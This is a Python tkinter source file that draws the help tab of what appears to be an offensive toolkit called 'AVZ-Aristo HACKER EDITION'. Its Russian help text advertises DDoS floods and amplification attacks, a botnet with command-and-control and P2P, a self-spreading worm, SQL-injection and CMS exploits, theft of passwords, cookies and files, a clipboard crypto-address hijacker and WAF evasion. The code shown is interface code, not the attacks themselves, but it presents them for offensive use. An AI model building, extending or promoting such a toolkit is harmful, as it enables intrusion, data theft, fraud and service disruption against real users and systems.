import tkinter as tk
from tkinter import scrolledtext
import json

class HelpTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.text = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=80, height=30,
                                              bg="#0a0a0a", fg="#00ff00", insertbackground="#00ff00")
        self.text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.load_help()

    def load_help(self):
        try:
            with open("version.json", "r") as f:
                version = json.load(f).get("version", "unknown")
        except:
            version = "unknown"
        help_text = f"""
╔══════════════════════════════════════╗
║     AVZ-Aristo v{version} HACKER EDITION      ║
╚══════════════════════════════════════╝

Ключевые возможности:
- DDoS арсенал: SYN, UDP, ICMP, Slowloris, HTTP, DNS Amp, NTP Amp, Multivector Burst, TLS Exhaust
- Ботнет с C2/WebSocket и децентрализованной P2P-сетью (Kademlia)
- Автономный червь для Windows/Linux/IoT
- Веб-взлом: SQL-инъектор (sqlmap), CMS-эксплойты (WP, Joomla, Drupal)
- Сбор данных: пароли, куки, скриншоты, файлы по маске
- Крипто-хищник: перехват адресов в буфере обмена
- AI-анализатор цели с рекомендациями по атаке
- Голосовое управление через Telegram
- Обход WAF (продвинутые техники)
- Облачная ферма VPS (автодеплой)

"""
        self.text.insert(tk.END, help_text)
        self.text.config(state=tk.DISABLED)
